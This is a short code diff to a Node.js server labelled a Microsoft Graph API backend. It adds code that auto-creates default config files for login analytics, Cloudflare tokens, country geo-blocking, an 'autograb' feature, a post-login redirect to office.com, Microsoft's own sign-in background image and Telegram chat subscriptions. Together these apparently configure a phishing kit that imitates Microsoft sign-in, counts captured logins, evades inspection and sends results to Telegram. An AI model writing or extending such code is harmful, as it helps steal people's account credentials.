@@ -3137,6 +3137,25 @@ if (!fs.existsSync(sessionDir)) {
     console.log('📁 Created session_data directory');
 }
 
+// Auto-create required configuration files with defaults
+const configFiles = {
+    'analytics.json': { totalLogins: 0, successfulLogins: 0, failedLogins: 0 },
+    'cloudflare-config.json': { apiToken: null, apiKey: null, email: null, zoneId: null, configured: false, enabled: false },
+    'geo-block-config.json': { enabled: false, allowedCountries: [], blockedCountries: [], mode: 'allow', customRedirects: [] },
+    'autograb-config.json': { enabled: false, autoRedirect: true, patterns: [] },
+    'redirect-config.json': { redirectUrl: 'https://office.com', lastUpdated: new Date().toISOString() },
+    'background-config.json': { backgroundUrl: 'https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg', lastUpdated: new Date().toISOString() },
+    'telegram_subscriptions.json': { chatIds: [], lastUpdated: new Date().toISOString() }
+};
+
+for (const [filename, defaultContent] of Object.entries(configFiles)) {
+    const filePath = path.join(__dirname, filename);
+    if (!fs.existsSync(filePath)) {
+        fs.writeFileSync(filePath, JSON.stringify(defaultContent, null, 2));
+        console.log(`📄 Created ${filename} with defaults`);
+    }
+}
+
 // Start server
 const server = app.listen(PORT, '0.0.0.0', () => {
     console.log('🚀 Microsoft Graph API Backend running on port', PORT);
